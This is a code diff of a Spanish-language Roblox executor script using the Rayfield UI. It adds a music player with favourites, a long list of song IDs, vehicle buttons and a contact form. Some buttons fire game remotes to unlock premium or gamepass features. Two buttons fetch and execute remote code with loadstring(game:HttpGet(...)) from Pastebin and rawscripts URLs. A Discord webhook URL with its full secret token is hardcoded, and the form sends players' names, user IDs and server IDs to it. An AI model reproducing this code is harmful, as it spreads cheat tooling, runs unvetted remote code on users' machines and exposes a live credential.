+        Content = "Estas canciones se guardan en tu dispositivo y se cargan al reiniciar el script."
+    })
+    
+    for _, fav in ipairs(favs) do
+        FavTb:CreateSection("🎵 " .. fav.name)
+        
+        FavTb:CreateButton({
+            Name = "▶️ Reproducir",
+            Callback = function()
+                ButtonPSound()
+                if MusicPassMode then
+                    UniversalPlay(fav.id)
+                else
+                    NoGamePass(fav.id)
+                end
+                Rayfield:Notify({
+                    Title = fav.name,
+                    Content = "¡Reproduciendo!",
+                    Duration = 2
+                })
+            end
+        })
+        
+        FavTb:CreateButton({
+            Name = "❌ Eliminar de Favoritos",
+            Callback = function()
+                ButtonPSound()
+                if RemoveFavorite(fav.id) then
+                    Rayfield:Notify({
+                        Title = "🗑️ Eliminado",
+                        Content = fav.name .. " ya no está en favoritos",
+                        Duration = 2
+                    })
+                    Rayfield:Notify({
+                        Title = "🔄 Reinicia el script",
+                        Content = "Para ver la lista actualizada, re-ejecuta el script",
+                        Duration = 5
+                    })
+                end
+            end
+        })
+    end
+end
 
-    hopCountBtn.MouseButton1Click:Connect(function()
-        minPlayers += 1
-        if minPlayers > 5 then minPlayers = 1 end
-        hopCountBtn.Text = tostring(minPlayers)
-    end)
-    hopCountBtn.MouseEnter:Connect(function()
-        TweenService:Create(hopCountBtn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(30, 40, 55) }):Play()
-    end)
-    hopCountBtn.MouseLeave:Connect(function()
-        TweenService:Create(hopCountBtn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(20, 25, 35) }):Play()
-    end)
-    hopBtn.MouseEnter:Connect(function()
-        TweenService:Create(hopBtn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(40, 80, 130) }):Play()
-    end)
-    hopBtn.MouseLeave:Connect(function()
-        TweenService:Create(hopBtn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(30, 60, 100) }):Play()
-    end)
+BuildFavoritesUI()
 
-    local function findServer(minPlayers)
-        local url = "https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
-        local ok, result = pcall(function() return game:HttpGet(url) end)
-        if not ok or not result or result == "" then return nil end
-        local ok2, data = pcall(HttpService.JSONDecode, HttpService, result)
-        if not ok2 or not data or not data.data then return nil end
-        local currentJob = tostring(JobId)
-        local candidates = {}
-        for _, srv in ipairs(data.data) do
-            if srv.id and currentJob ~= tostring(srv.id) and srv.playing and minPlayers <= srv.playing and srv.playing > 0 then
-                table.insert(candidates, tostring(srv.id))
+FavTb:CreateSection("⚙️ Opciones")
+
+FavTb:CreateButton({
+    Name = "🔄 Recargar Lista",
+    Callback = function()
+        ButtonPSound()
+        ReloadFavorites()
+        Rayfield:Notify({
+            Title = "🔄 Recargado",
+            Content = "Tienes " .. #GetFavorites() .. " favoritos guardados",
+            Duration = 3
+        })
+    end
+})
+
+FavTb:CreateButton({
+    Name = "🗑️ Borrar TODOS los Favoritos",
+    Callback = function()
+        ButtonPSound()
+        ClearFavorites()
+        Rayfield:Notify({
+            Title = "🗑️ Favoritos borrados",
+            Content = "Se eliminaron todas las canciones. Reinicia el script para ver los cambios.",
+            Duration = 5
+        })
+    end
+})
+
+FavTb:CreateParagraph({
+    Title = "ℹ️ Información",
+    Content = "Tus favoritos se guardan en el archivo 'Irvinglz1_Favorites.json' dentro de la carpeta Workspace de tu ejecutor. Persisten aunque cierres Roblox."
+})
+
+-- ═══════════════════════════════════════════════════════
+
+local MensajeHttpService = game:GetService("HttpService")
+local MensajePlayer = game:GetService("Players").LocalPlayer
+local WEBHOOK_MENSAJES = "https://discord.com/api/webhooks/1545842550261293258/S5v4pF1LpzQUllwHGSnhI4714x2_Fl6B1b_bdQ7KwZDYdKMshjnDuaiGHJKZcWI1uL3x"
+local MAX_CARACTERES = 500
+
+local function sendMessageToCreator(messageText)
+    if WEBHOOK_MENSAJES == "" or not WEBHOOK_MENSAJES then
+        return false
+    end
+    
+    local playerName = MensajePlayer.Name
+    local displayName = MensajePlayer.DisplayName
+    local userId = MensajePlayer.UserId
+    local date = os.date("%Y-%m-%d %H:%M:%S", os.time())
+    
+    local avatarUrl = ""
+    pcall(function()
+        local avatarRequest = string.format('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false', userId)
+        local avatarData = MensajeHttpService:JSONDecode(game:HttpGet(avatarRequest))
+        if avatarData and avatarData.data and avatarData.data[1] then
+            avatarUrl = avatarData.data[1].imageUrl
+        end
+    end)
+    
+    local data = {
+        ["content"] = "💬 **¡Nuevo mensaje para el creador!**",
+        ["embeds"] = {{
+            ["title"] = "📩 Mensaje de " .. displayName,
+            ["color"] = 16744576,
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Usuario",
+                    ["value"] = displayName .. " (@ " .. playerName .. ")",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🆔 User ID",
+                    ["value"] = tostring(userId),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "💬 Mensaje",
+                    ["value"] = messageText,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🕐 Fecha/Hora",
+                    ["value"] = date,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🔑 Server ID",
+                    ["value"] = "`" .. game.JobId .. "`",
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Sistema de Mensajes"
+            },
+            ["timestamp"] = DateTime.now():ToIsoDate(),
+            ["thumbnail"] = {
+                ["url"] = avatarUrl
+            }
+        }}
+    }
+    
+    local encodedData = MensajeHttpService:JSONEncode(data)
+    local success = false
+    
+    pcall(function()
+        if syn and syn.request then
+            local response = syn.request({
+                Url = WEBHOOK_MENSAJES,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = encodedData
+            })
+            if response and response.StatusCode == 204 then
+                success = true
+                return
             end
         end
-        if #candidates == 0 then return nil end
-        return candidates[math.random(1, #candidates)]
+        
+        if not success and http and http.request then
+            local response = http.request({
+                Url = WEBHOOK_MENSAJES,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = encodedData
+            })
+            if response and response.StatusCode == 204 then
+                success = true
+                return
+            end
+        end
+        
+        if not success and request then
+            local response = request({
+                Url = WEBHOOK_MENSAJES,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = encodedData
+            })
+            if response and response.StatusCode == 204 then
+                success = true
+                return
+            end
+        end
+        
+        if not success then
+            MensajeHttpService:PostAsync(WEBHOOK_MENSAJES, encodedData, Enum.HttpContentType.ApplicationJson)
+            success = true
+        end
+    end)
+    
+    return success
+end
+
+ContactTab:CreateSection("💬 Enviar Mensaje al Creador")
+
+ContactTab:CreateParagraph({
+    Title = "📝 ¿Quieres contactar al creador?",
+    Content = "Reporta bugs, haz sugerencias o contacta directamente."
+})
+
+local mensajeTexto = ""
+
+ContactTab:CreateInput({
+    Name = "Tu Mensaje!",
+    PlaceholderText = "AQUI LO QUE QUIERAS DECIR UN INSULTO BANEADO",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(Value)
+        mensajeTexto = Value
+    end,
+})
+
+local enviando = false
+
+ContactTab:CreateButton({
+    Name = "Enviar Mensaje",
+    Callback = function()
+        if enviando then
+            Rayfield:Notify({
+                Title = "⏳ Enviando Mensaje",
+                Content = "PACIENCIA",
+                Duration = 2,
+                Image = 4483362458,
+            })
+            return
+        end
+        
+        if mensajeTexto == "" or mensajeTexto:match("^%s*$") then
+            Rayfield:Notify({
+                Title = "❌ Mensaje Vacío",
+                Content = "ESCRIBE ALGO BROO",
+                Duration = 3,
+                Image = 4483362458,
+            })
+            return
+        end
+        
+        if string.len(mensajeTexto) > MAX_CARACTERES then
+            Rayfield:Notify({
+                Title = "❌ Mensaje Muy Largo",
+                Content = "Tu mensaje excede el límite de " .. MAX_CARACTERES .. " caracteres",
+                Duration = 3,
+                Image = 4483362458,
+            })
+            return
+        end
+        
+        enviando = true
+        
+        Rayfield:Notify({
+            Title = "⏳ Enviando Mensaje",
+            Content = "Mensaje enviandose...",
+            Duration = 2,
+            Image = 4483362458,
+        })
+        
+        task.wait(0.5)
+        
+        local sendSuccess, sendResult = pcall(function()
+            return sendMessageToCreator(mensajeTexto)
+        end)
+        
+        if not sendSuccess then
+            Rayfield:Notify({
+                Title = "❌ Error",
+                Content = "Error interno ni puta idea",
+                Duration = 5,
+                Image = 4483362458,
+            })
+            enviando = false
+            return
+        end
+        
+        local success = sendResult
+        
+        if success then
+            Rayfield:Notify({
+                Title = "✅ ¡Éxito!",
+                Content = "Tu mensaje fue enviado correctamente.!!",
+                Duration = 4,
+                Image = 4483362458,
+            })
+            
+            mensajeTexto = ""
+        else
+            Rayfield:Notify({
+                Title = "❌ Error",
+                Content = "No se pudo enviar el mensaje. Intenta más tarde.",
+                Duration = 3,
+                Image = 4483362458,
+            })
+        end
+        
+        enviando = false
     end
+})
 
-    hopBtn.MouseButton1Click:Connect(function()
-        hopBtn.Active = false
-        hopBtn.Text = "..."
-        hopBtn.TextColor3 = Color3.fromRGB(255, 210, 80)
-        setHopDot(Color3.fromRGB(255, 210, 80))
+ContactTab:CreateSection("ℹ️ Información")
 
-        local target = findServer(minPlayers)
-        if not target then
-            hopBtn.Text = "NONE"
-            hopBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
-            setHopDot(Color3.fromRGB(255, 80, 80))
-            task.wait(2)
-            hopBtn.Text = "ON"
-            hopBtn.TextColor3 = Color3.fromRGB(120, 200, 255)
-            setHopDot(Color3.fromRGB(180, 180, 180))
-            hopBtn.Active = true
+ContactTab:CreateParagraph({
+    Title = "🚫 Reglas Estrictas",
+    Content = "Si escribes algo malo, alguna cosa prohibida o algo de el de las reglas de abajo, te vas PERMA BANEADO del script.\n\nATT: Creador"
+})
+
+ContactTab:CreateParagraph({
+    Title = "📋 Reglas",
+    Content = "• Sé respetuoso y constructivo\n• No uses lenguaje ofensivo\n• No envíes spam."
+})
+
+local ScriptsTb = Window:CreateTab("🧾 Scripts", 4483362458)
+
+PlaysTb:CreateSection("Elige si quieres reproducir música con o sin Music Pass.")
+local ToggleMusicPass = PlaysTb:CreateToggle({
+   Name = "Con Music Pass ✅",
+   CurrentValue = true,
+   Flag = "MusicPassToggle",
+   Callback = function(Value)
+      ButtonPSound()
+      MusicPassMode = Value
+      if Value then
+         Rayfield:Notify({
+            Title = "Modo Música",
+            Content = "Con Music Pass Activado",
+            Duration = 2
+         })
+      else
+         Rayfield:Notify({
+            Title = "Modo Música",
+            Content = "Sin Music Pass Activado",
+            Duration = 2
+         })
+      end
+   end,
+})
+
+PlaysTb:CreateSection("Introduce ID Personalizada")
+local customID = ""
+PlaysTb:CreateInput({
+   Name = "Song ID",
+   PlaceholderText = "Pega aquí...",
+   Callback = function(t) ButtonPSound() customID = t end,
+})
+PlaysTb:CreateButton({
+   Name = "▶️ Reproducir ID Manual",
+   Callback = function() ButtonPSound() UniversalPlay(customID) end,
+})
+
+PlaysTb:CreateButton({
+   Name = "⭐ Guardar ID Manual en Favoritos",
+   Callback = function()
+       ButtonPSound()
+       if customID and customID ~= "" then
+           local added = AddFavorite("ID Manual: " .. customID, customID)
+           if added then
+               Rayfield:Notify({
+                   Title = "⭐ Guardado",
+                   Content = "ID " .. customID .. " añadido a favoritos",
+                   Duration = 2
+               })
+           else
+               Rayfield:Notify({
+                   Title = "⚠️ Ya existe",
+                   Content = "Esa ID ya está en favoritos",
+                   Duration = 2
+               })
+           end
+       else
+           Rayfield:Notify({
+               Title = "❌ Error",
+               Content = "Primero introduce una ID",
+               Duration = 2
+           })
+       end
+   end,
+})
+
+PlaysTb:CreateButton({
+   Name = "⏹️ Detener Música",
+   Callback = function() 
+       ButtonPSound()
+       UniversalStop() 
+       StopMusic()
+   end,
+})
+
+local VolumeRemote = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUIHandler"):WaitForChild("MainAudio"):WaitForChild("Catalog"):WaitForChild("Header"):WaitForChild("VolumeContainer"):WaitForChild("VolumeChangeRequest")
+
+local VolumeSlider = PlaysTb:CreateSlider({
+   Name = "🔊 Control de Volumen",
+   Range = {1, 100},
+   Increment = 5,
+   CurrentValue = 50,
+   Suffix = "%",
+   Flag = "VolumeSlider",
+   Callback = function(Value)
+      ButtonPSound()
+      pcall(function()
+          VolumeRemote:FireServer(Value)
+      end)
+   end,
+})
+
+PlaysTb:CreateSection("Elige tu vehículo para música")
+PlaysTb:CreateButton({
+    Name = "💎 Necesita Premium: SegwaySmall",
+    Callback = function()
+        ButtonPSound()
+        vehicleRemote:FireServer("SegwaySmall")
+        task.wait(1)
+        local args = {"ShockWave"}
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SetUnderglow"):InvokeServer(unpack(args))
+        local args2 = {1.5, 1.5}
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SetUnderglowSize"):InvokeServer(unpack(args2))
+        Rayfield:Notify({Title = "Sistema", Content = "Segway Premium Glitcheado!", Duration = 2})
+    end
+})
+
+PlaysTb:CreateButton({
+    Name = "🛹 Sin Premium: Skateboard",
+    Callback = function()
+        ButtonPSound()
+        vehicleRemote:FireServer("SkateBoard")
+        task.wait(1)
+        local args = {"ShockWave"}
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SetUnderglow"):InvokeServer(unpack(args))
+        local args2 = {1.6, 1.5}
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SetUnderglowSize"):InvokeServer(unpack(args2))
+        Rayfield:Notify({Title = "Sistema", Content = "Skateboard Glitcheado!", Duration = 2})
+    end
+})
+
+PlaysTb:CreateButton({
+    Name = "❌ Eliminar Vehículo & Reiniciar",
+    Callback = function()
+        ButtonPSound()
+        vehicleRemote:FireServer("Delete NoMotorVehicle")
+        pcall(function()
+            if player.Character and player.Character:FindFirstChild("Humanoid") then
+                player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Running)
+            end
+        end)
+        Rayfield:Notify({Title = "Sistema", Content = "Vehículo Eliminado!", Duration = 2})
+    end
+})
+
+PlaysTb:CreateToggle({
+   Name = "🌈 Vehicle RGB (necesitas gamepass puto brook) ",
+   CurrentValue = false,
+   Flag = "VehicleRgbToggle",
+   Callback = function(Value)
+      ButtonPSound()
+      vehicleRgb = Value
+      if vehicleRgb then
+          task.spawn(function()
+              while vehicleRgb do
+                  hueValue = (hueValue + 0.02) % 1
+                  local smoothColor = Color3.fromHSV(hueValue, 1, 1)
+                  pcall(function()
+                      CarRemote:FireServer("NoMotorColor", smoothColor)
+                  end)
+                  pcall(function()
+                      game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SetUnderglowColor"):InvokeServer(1, smoothColor)
+                  end)
+                  task.wait(0.05) 
+              end
+          end)
+      end
+   end,
+})
+
+local AntiSitToggleObject = PlaysTb:CreateToggle({
+    Name = "⭕Anti-Sit",
+    CurrentValue = false,
+    Flag = "AntiSitToggle",
+    Callback = function(Value)
+        ButtonPSound()
+        SetAntiSit(Value)
+    end
+})
+
+PlaysTb:CreateButton({
+    Name = "Irving Spammer",
+    Callback = function()
+        ButtonPSound()
+        loadstring(game:HttpGet("https://pastebin.com/raw/zBaumpUd"))()
+    end
+})
+
+PlaysTb:CreateButton({
+    Name = "Irving Emote Gui",
+    Callback = function()
+        ButtonPSound()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Emote-Gui-75782"))()
+    end
+})
+
+PlaysTb:CreateParagraph({
+    Title = "¿Cómo funciona?",
+    Content = "El vehículo aparecerá al presionar el botón, y el personaje volará automáticamente después de 1 segundo. Presiona 'Eliminar' para reiniciar."
+})
+
+AddSong(SongsTb, "Mi Mai luis Brown [NuevaCancion]", 93005349496098)
+AddSong(SongsTb, "Glizzy Zazaaaa[NuevaCancion]", 110433757003368)
+AddSong(SongsTb, "Victor Mendigoza", 120626425740489)
+AddSong(SongsTb, "Nose cuál es pero está 10/10[NuevaCancion]", 98382295999442)
+AddSong(SongsTb, "3BallMTY Chicas Tribaleras [NuevaCancion]", 92870129053050)
+AddSong(SongsTb, "Ketde [Sugerencia de Joshua]", 93930555396098)
+AddSong(SongsTb, "El mago de la melodía [Sugerencia deTXLSaNtIaGoLXT]", 10124269884556)
+AddSong(SongsTb, "Nose [Cancion de JH_LIAN (mi hijo)]", 80735192805425)
+AddSong(SongsTb, "NI KAKA IDEA [Suegerencia de TXLSaNtIaGoLXT ]", 108721795687965)
+AddSong(SongsTb, "50/50 Ando en la Disco (Da Players Town)", 113647013354970)
+AddSong(SongsTb, "ROJO VIVO [NO ES LOUD TAMPOCI CREO Q VAYA]", 140563236804727)
+AddSong(SongsTb, "Si Mijo Si [NuevaCancion]", 129825897352810)
+AddSong(SongsTb, "no se de anuel [Sugerencia de AguanteEl_Agu]", 72142029907010)
+AddSong(SongsTb, "Riki - Neton Vega [MADE BY SOYOSCAR68]", 94106216739501)
+AddSong(SongsTb, "NOSE [Sugerencia de JXZ]", 125108600647147)
+AddSong(SongsTb, "Ganas Kris r [Made by Almighty]", 96546210289866)
+AddSong(SongsTb, "tripabuski [Sugerencia de M3LOON]", 76399771617087)
+AddSong(SongsTb, "Old Audio BALINIZA Y SU EQUIPON [milke, y plkso]", 132657824331252)
+AddSong(SongsTb, "DE MUJER [Sugerencia de 23_GAEL]", 112829835839977)
+AddSong(SongsTb, "Punta CAna [Sugerencia de JH_LIAN]", 96170434808217)
+AddSong(SongsTb, "FOREIGN [SUGERENCIA DE MILKE_X]", 96448997190133)
+AddSong(SongsTb, "Nose[Sugerencia de Milke_x]", 103622383502249)
+AddSong(SongsTb, "Como antes [Milke_x Jorgue_78]", 114815589658182)
+AddSong(SongsTb, "CANSADA [Jorge_intro Jorgue_78]", 95476903722799)
+AddSong(SongsTb, "124_z Bebesitabebelin [ Milke_x]", 126529839322967)
+AddSong(SongsTb, "nose [milke_x]", 80488815553151)
+AddSong(SongsTb, "Esperándote [Jorgue_78 milke_x]", 80420147200412)
+AddSong(SongsTb, "See_Trap7 Jorge_7x Milke_x", 99431678056535)
+AddSong(SongsTb, "Maka  [Made by Milke_x]", 113045147285146)
+AddSong(SongsTb, "Corrido [Made by Milke_x]", 108484635464666)
+AddSong(SongsTb, "Jueves en Culiaca [Made by Milke_xd]", 100164487427073)
+AddSong(SongsTb, "Diavla [made by Milke_x]", 85241845241373)
+AddSong(SongsTb, "Nose [Sugerencia de eltallovicente123]", 111991747714255)
+AddSong(SongsTb, "rari peso pluma [Sugerencia de eltallovicente123]]", 102689026895497)
+AddSong(SongsTb, "No se de warfell [Sugerencia de eltallovicente123]", 124754962956595)
+AddSong(SongsTb, "Una Baby En Santiago [Nueva Cancion]", 137784048924046)
+AddSong(SongsTb, "pa arriba pa abajo lento ozi [Sugerencia de M3LOON]", 129723425642125)
+AddSong(SongsTb, "Terranova [Sugerencia de M3LOON]", 131763483961136)
+AddSong(SongsTb, "Saquen el cristal [Sugerencia de XIXStivenIXI]", 104813810100265)
+AddSong(SongsTb, "Cuaziteo [Sugerencia de Josmil_11 Gracias!!]", 71251641989884)
+AddSong(SongsTb, "P.V. victor mendivil Marky_11 y Slashamane [NuevaCancion]", 99428076858749)
+AddSong(SongsTb, "Mamy Lil naay [NuevaCancion]", 136818512125739)
+AddSong(SongsTb, "Swagger [NuevaCancion]", 71343492751663)
+AddSong(SongsTb, "La droga es mala [NuevaCancion]", 126900583173544)
+AddSong(SongsTb, "Baby Supreme [NuevaCancion]", 120434145866379)
+AddSong(SongsTb, "FlowWare [NuevaCancion]", 70553084556448)
+AddSong(SongsTb, "pase y toque[NuevaCancion]", 106102159933794)
+AddSong(SongsTb, "KAOZZX El Mike V1 [NuevaCancion]", 99853885036276)
+AddSong(SongsTb, "Tainy, Rauw Alejandro & JHAYCO - Rosita [NuevaCancion]", 115681518617952)
+AddSong(SongsTb, "Marcianeke - DIMELO MÁ ft Pailita [NuevaCancion]", 74475244149345)
+AddSong(SongsTb, "Bad Bunny, Feid - PERRO NEGRO [NuevaCancion]", 104834915251457)
+AddSong(SongsTb, "NIKAKAIDEA [NuevaCancion]", 102657834841070)
+AddSong(SongsTb, "le quiere bajar [NuevaCancion]", 92354865759525)
+AddSong(SongsTb, "Noa Noche En Medellín [NuevaCancion]", 99256604123487)
+AddSong(SongsTb, "Porte Fino [NuevaCancion]", 80677465709646)
+AddSong(SongsTb, "Entre tú y yo [NuevaCancion]", 76781449649578)
+AddSong(SongsTb, "Nose [NuevaCancion]", 72293596419310)
+AddSong(SongsTb, "BigSoto Bzrp [NuevaCancion]", 135272749570886)
+AddSong(SongsTb, "Naqueto - Yvn lvcas [NuevaCancion]", 76754385791475)
+AddSong(SongsTb, "Mi Nena - Nueva Conducta [NuevaCancion]", 134361335899706)
+AddSong(SongsTb, "Money Pacquiao - Natanael Cano [NuevaCancion]", 84001479493205)
+AddSong(SongsTb, "El Chiricuazo - Makabelico [NuevaCancion]", 134028986072560)
+AddSong(SongsTb, "A su vato engaña - Santa Grifa [NuevaCancion]", 132525879805359)
+AddSong(SongsTb, "Esclava Remix [Sugerencia de Rip_R1onaldo]", 81001814886089)
+AddSong(SongsTb, "Naci para amarte - Junior H [NuevaCancion]", 92192524630393)
+AddSong(SongsTb, "Kileros - Uriel Gaxiola, Nata y Anuel [NuevaCancion]", 129475514961321)
+AddSong(SongsTb, "El maestro - El Makabelico [NuevaCancion]", 95028776242006)
+AddSong(SongsTb, "No sabes kuanto te amo - helabroke naxowo [NuevaCancion]", 72029351551537)
+AddSong(SongsTb, "estamos al aire - santa grifa [NuevaCancion]", 82664276883523)
+AddSong(SongsTb, "ksi empelota - slow g [NuevaCancion]", 136352011306256)
+AddSong(SongsTb, "cullinan - peso pluma tombochio [NuevaCancion]", 132333973168476)
+AddSong(SongsTb, "NO SE SI ME QUIERES VER - HELABROKE [NuevaCancion]", 109855169943253)
+AddSong(SongsTb, "BAD LUCK - CRAZY POINT [NuevaCancion]", 112818967585525)
+AddSong(SongsTb, "JAPONESE - KID LUCILFER [NuevaCancion]", 107379283250737)
+AddSong(SongsTb, "GANE VICTOR MENDIVIL [NuevaCancion]", 114607540355383)
+AddSong(SongsTb, "OHTANI OMAR CAMACHO [NuevaCancion]", 139124603505356)
+AddSong(SongsTb, "LA TANGA V2 MAKABELICO [NuevaCancion]", 73135957170161)
+AddSong(SongsTb, "NETFLIXXX BAD BUNNY BRYTIAGO [NuevaCancion]", 107521084886681)
+AddSong(SongsTb, "NADIE ESTA HABLANDO DE AMAR ANUEL [NuevaCancion]", 98390297607269)
+AddSong(SongsTb, "SPEEDY KAKTOV (LIANNSLZ X DRIX) [NuevaCancion]", 108076828229616)
+AddSong(SongsTb, "BATEANDO COMO LOS YANKEES (SHELBY) (LIANNSLZ X DRIX) [NuevaCancion]", 103461241702539)
+AddSong(SongsTb, "PURPLE YOUNG DARHI (LIANNSLZ X DRIX) [NuevaCancion]", 97733383447943)
+AddSong(SongsTb, "VICTORIA VICTOR MENDIVIL EL MALILLA [NuevaCancion]", 108425323821381)
+AddSong(SongsTb, "MUERTO EN VIDA SANTA GRIFA [NuevaCancion]", 103331394859761)
+AddSong(SongsTb, "WO CRAZY POINT [NuevaCancion]", 75196377290071)
+AddSong(SongsTb, "YOGURCITO BLESSD [NuevaCancion]", 137685175841613)
+AddSong(SongsTb, "MAS FAMA REMP LOBO66 [NuevaCancion]", 79317711363563)
+AddSong(SongsTb, "SINOMELLORANVIVO LA OBSESION [NuevaCancion]", 81633648426381)
+AddSong(SongsTb, "TIRAMISUSHI MATIAS CANDIA [NuevaCancion]", 70799971319619)
+AddSong(SongsTb, "CANSADA [NuevaCancion]", 75500567967936)
+AddSong(SongsTb, "Victor nose que", 129449587699547)
+AddSong(SongsTb, "NOSE CUAL ES", 131108887514627)
+AddSong(SongsTb, "Torpe Rompe Bolsillos Hinchados (Acapella)", 100052544825343)
+AddSong(SongsTb, "Yeyo amor, cómo ESTÁS???", 89058278989739)
+AddSong(SongsTb, "DESVELADO", 82223376167137)
+AddSong(SongsTb, "Manuel Rodriguez El Black", 128552555209564)
+AddSong(SongsTb, "BB Trickz Super", 78482955772484)
+AddSong(SongsTb, "Ysrael Barajas GPI", 114513539517568)
+AddSong(SongsTb, "Nose cuál es", 80920308775995)
+AddSong(SongsTb, "La Más Draga CACHITO", 111416382711865)
+AddSong(SongsTb, "Chuvin CASADITAS", 111684524530073)
+AddSong(SongsTb, "Kodak Black Gave It All I Got", 92014405792280)
+AddSong(SongsTb, "4X4 Omar Camacho", 106779262199873)
+AddSong(SongsTb, "Te quiero Jose❤", 71545646409670)
+AddSong(SongsTb, "Tiniebla", 103601957304373)
+AddSong(SongsTb, "Comandante Bonito- Makabelico", 114616883039515)
+AddSong(SongsTb, "King Of Waches Omar C.", 90859442818485)
+AddSong(SongsTb, "Óscar Maydon Don Dimadon", 135220782344702)
+AddSong(SongsTb, "Faraón Love Shady Duro 2 Horas", 139466297868662)
+AddSong(SongsTb, "MAESTRO", 137615795245000)
+AddSong(SongsTb, "los alegres del barranco", 133757497048417)
+AddSong(SongsTb, "Las Muñequitas Remix - Mr Plata, Americano 4kt Maluma", 83940945192283)
+AddSong(SongsTb, "topon del diablo - Makabelico", 97210562605927)
+AddSong(SongsTb, "nalguita y teta", 109159861086023)
+AddSong(SongsTb, "La Navaja Victor Mendieta", 128999238382127)
+AddSong(SongsTb, "1v1 Victor Mendivil", 105965692492381)
+AddSong(SongsTb, "Lil Pimp 187 Pimp Dat Ho", 84001921733662)
+AddSong(SongsTb, "Culitos bailando", 113875800950122)
+AddSong(SongsTb, "Hanzel La H Loyalty 4 Ever", 93643154442544)
+AddSong(SongsTb, "Diles - Bad Bunny", 74880410112427)
+AddSong(SongsTb, "Cuaziteo Konda pa", 88868219154270)
+AddSong(SongsTb, "Fuerza Regida Descansando", 135571123743903)
+AddSong(SongsTb, "Omar Courtz MI BB", 129843288099786)
+AddSong(SongsTb, "Incognito Los Anormales", 121190703708882)
+AddSong(SongsTb, "Alejandro Ochoa Los santos", 91316743791287)
+AddSong(SongsTb, "Cuando no era cantante - FR", 121818171652264)
+AddSong(SongsTb, "Barbas - Thanos", 130358890671515)
+AddSong(SongsTb, "Punta - BABYLOCC83", 85278494799644)
+AddSong(SongsTb, "One Of The Girls - Cris Mj", 100940565244037)
+AddSong(SongsTb, "Elecciones - Victor Mendivil", 131059155322646)
+AddSong(SongsTb, "El Solorio V2 - Makabelico", 131768874224372)
+AddSong(SongsTb, "Soy de Laredo - El MakaBeliko", 125707067447312)
+AddSong(SongsTb, "Kamikaze - Natael C.", 92531434219099)
+AddSong(SongsTb, "Hago pactos", 105232506951457)
+AddSong(SongsTb, "El papy v1 - MakaBeliko", 111830642213484)
+AddSong(SongsTb, "PeRRa BB - Hades66", 71067954567084)
+AddSong(SongsTb, "Ouija - Víctor Mendivil", 114307189313112)
+AddSong(SongsTb, "C Blu Blu Bop", 130790885928978)
+AddSong(SongsTb, "Domp - EEUU", 124538907276340)
+AddSong(SongsTb, "Rafagas al viento", 96241073891709)
+AddSong(SongsTb, "Cali Kush - Ghetto", 92240058255226)
+AddSong(SongsTb, "Tito Double P - DELTAS", 97615700145830)
+AddSong(SongsTb, "ReyCh9 - CONEJITA 2", 106183012774250)
+AddSong(SongsTb, "Alan Arrieta - Ay Mamita", 108906235872943)
+AddSong(SongsTb, "Ñengo Flow - SI ME HICIERA EL DE LA LENGUA", 85081125606012)
+AddSong(SongsTb, "Midnvght - MIENTEME", 133983548973786)
+AddSong(SongsTb, "Clarent Buenas", 125201047725056)
+AddSong(SongsTb, "YOVNGCHIMI DJ Khaled Dei V HVRACAN", 107633120512382)
+AddSong(SongsTb, "Anuel aa Donde Hubo Fuego Cenizas Quedan", 104274011253531)
+AddSong(SongsTb, "King Nassir", 76650356472656)
+AddSong(SongsTb, "PsMvfiv Zumbandola Victor Mendivil", 75760491748269)
+AddSong(SongsTb, "KLK Victor Mendivil", 109613437074353)
+AddSong(SongsTb, "Hades66 Botonazo", 113269872401718)
+AddSong(SongsTb, "FloyyMenor X Oscar Maydon - Pastillita de color", 82201176290322)
+AddSong(SongsTb, "Hades66 Yo Soy El Que Eh", 125385799696269)
+AddSong(SongsTb, "Juhn Fanny Pack", 132605807379581)
+AddSong(SongsTb, "Slayter evilshxt", 86568274989506)
+AddSong(SongsTb, "Luis Carillo Contando", 97702334227645)
+AddSong(SongsTb, "El Mayor De Las Ranas", 98857200095314)
+AddSong(SongsTb, "Panti Colale 2.0", 117334682026487)
+AddSong(SongsTb, "Yo Quiero - Hades66", 98091356560701)
+AddSong(SongsTb, "SHABADUBAB - iZaak y Randy Nota Loca", 101023033810738)
+AddSong(SongsTb, "Manhattan 2 - Hades66", 103930310389031)
+AddSong(SongsTb, "Netflix And Chill - Anuel AA y ROA", 80278228506747)
+AddSong(SongsTb, "Las Más Bonitas Son Putas - Anuel AA", 94389767233616)
+AddSong(SongsTb, "La Jeep", 88820527771697)
+AddSong(SongsTb, "El De La Lengua - Hades66", 75034816221796)
+AddSong(SongsTb, "Ponte Perrita", 137042534442974)
+AddSong(SongsTb, "Guaracha", 86639637681704)
+AddSong(SongsTb, "Telepatía", 93886524603751)
+AddSong(SongsTb, "Kiyo", 90813223538688)
+AddSong(SongsTb, "Beso de 3", 127563987773520)
+AddSong(SongsTb, "512", 77142753938657)
+AddSong(SongsTb, "Se me paro - Ozuna", 125482701736090)
+AddSong(SongsTb, "El envidioso - Nosotros los guapos", 87878635815212)
+AddSong(SongsTb, "Tu eres mi mundo", 83346880265745)
+AddSong(SongsTb, "Bocas por callar", 107931865324215)
